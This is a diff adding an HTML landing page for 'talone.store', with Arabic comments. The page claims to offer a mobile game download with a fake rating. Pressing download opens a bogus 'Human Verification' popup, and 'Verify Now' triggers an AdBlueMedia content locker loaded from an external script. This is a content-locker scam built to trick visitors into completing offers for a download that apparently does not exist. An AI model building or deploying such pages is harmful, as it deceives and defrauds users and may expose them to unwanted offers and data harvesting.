@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>talone.store</title>
+    
+    <!-- اللوكر الجديد الخاص بك لـ AdBlueMedia -->
+    <script type="text/javascript">
+        var NMbaM_HQD_oiOPLc={"it":4614449,"key":"7c902"};
+    </script>
+    <script src="https://d1g1lhd4vferpn.cloudfront.net/a19d6dc.js"></script>
+
+    <style>
+        :root {
+            --bg-color: #0b111e;
+            --card-bg: #151f32;
+            --primary-gradient: linear-gradient(135deg, #00b4db, #0083b0);
+            --verify-gradient: linear-gradient(135deg, #11998e, #38ef7d);
+            --glow-color: rgba(0, 180, 219, 0.4);
+            --text-main: #ffffff;
+            --text-muted: #8a99ad;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            margin-top: 10px;
+        }
+
+        .store-title {
+            font-size: 2.2rem;
+            font-weight: bold;
+            background: linear-gradient(to right, #00f2fe, #4facfe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+            text-transform: lowercase; /* للتأكد من بقائها بحروف صغيرة */
+        }
+
+        .store-subtitle {
+            color: var(--text-muted);
+            font-size: 1rem;
+        }
+
+        /* App Info Card Box */
+        .app-card {
+            background-color: var(--card-bg);
+            width: 100%;
+            max-width: 420px;
+            border-radius: 24px;
+            padding: 30px 24px;
+            text-align: center;
+            box-shadow: 0 0 25px var(--glow-color), inset 0 1px 2px rgba(255, 255, 255, 0.1);
+            border: 2px solid #00b4db;
+            transition: transform 0.3s ease;
+        }
+
+        .app-icon {
+            width: 130px;
+            height: 130px;
+            border-radius: 28px;
+            margin-bottom: 15px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+            object-fit: cover;
+        }
+
+        .app-meta {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+        }
+
+        .app-title {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .app-version {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-bottom: 25px;
+        }
+
+        /* Buttons */
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .btn-download {
+            background: var(--primary-gradient);
+            box-shadow: 0 6px 20px rgba(0, 180, 219, 0.4);
+        }
+
+        .btn-download:hover {
+            box-shadow: 0 8px 25px rgba(0, 180, 219, 0.6);
+            transform: scale(1.02);
+        }
+
+        .btn-verify {
+            background: var(--verify-gradient);
+            box-shadow: 0 6px 20px rgba(56, 239, 125, 0.4);
+        }
+
+        .btn-verify:hover {
+            box-shadow: 0 8px 25px rgba(56, 239, 125, 0.6);
+            transform: scale(1.02);
+        }
+
+        /* Popup / Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(11, 17, 30, 0.85);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .modal-content {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 380px;
+            border-radius: 24px;
+            padding: 30px 20px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+            transform: scale(0.8);
+            transition: transform 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: scale(1);
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            margin: 15px 0 10px 0;
+        }
+
+        .modal-text {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main App Screen -->
+    <div id="main-download-section">
+        <header>
+            <div class="store-title">talone.store</div>
+            <div class="store-subtitle">Download the latest mobile games instantly</div>
+        </header>
+
+        <div class="app-card">
+            <!-- حط رابط صورة اللعبة ديالك هنا -->
+            <img src="https://via.placeholder.com/150" alt="App Icon" class="app-icon">
+            
+            <div class="app-meta">
+                <span>🤖 Android</span>
+                <span>🍏 iOS</span>
+                <span>⭐ 4.9</span>
+            </div>
+
+            <div class="app-title">Meccha Chameleon</div>
+            <div class="app-version">Online Last Version</div>
+
+            <button class="btn btn-download" id="downloadBtn">Download Now</button>
+        </div>
+    </div>
+
+    <!-- Human Verification Popup -->
+    <div class="modal-overlay" id="verifyModal">
+        <div class="modal-content">
+            <img src="https://via.placeholder.com/150" alt="App Icon" class="app-icon" style="width:80px; height:80px; border-radius:18px; margin:0 auto;">
+            <div class="modal-title">Human Verification</div>
+            <div class="modal-text">Verify that you are human to secure your download.</div>
+            <button class="btn btn-verify" id="verifyNowBtn">Verify Now</button>
+        </div>
+    </div>
+
+    <!-- JavaScript التحكم الذكي -->
+    <script>
+        const downloadBtn = document.getElementById('downloadBtn');
+        const verifyModal = document.getElementById('verifyModal');
+        const verifyNowBtn = document.getElementById('verifyNowBtn');
+
+        // ظهور البوب آب عند الضغط على Download
+        downloadBtn.addEventListener('click', () => {
+            verifyModal.classList.add('active');
+        });
+
+        // تشغيل اللوكر الحقيقي عند الضغط على Verify Now
+        verifyNowBtn.addEventListener('click', () => {
+            verifyModal.classList.remove('active'); // إخفاء البوب آب أولاً
+            
+            // مهلة زمنية صغيرة جداً (300ms) للتأكد من أن الصفحة مستعدة لإطلاق اللوكر بدون تداخل
+            setTimeout(() => {
+                if (typeof _my === 'function') {
+                    _my(); 
+                } else {
+                    // حل احتياطي في حالة تأخر تحميل سكريبت الشركة
+                    console.log("إعادة محاولة إطلاق اللوكر...");
+                    if(typeof NMbaM_HQD_oiOPLc !== 'undefined') {
+                         _my();
+                    }
+                }
+            }, 300);
+        });
+
+        // إغلاق المودال عند الضغط خارج المربع الخارجي
+        verifyModal.addEventListener('click', (e) => {
+            if(e.target === verifyModal) {
+                verifyModal.classList.remove('active');
+            }
+        });
+    </script>
+</body>
+</html>
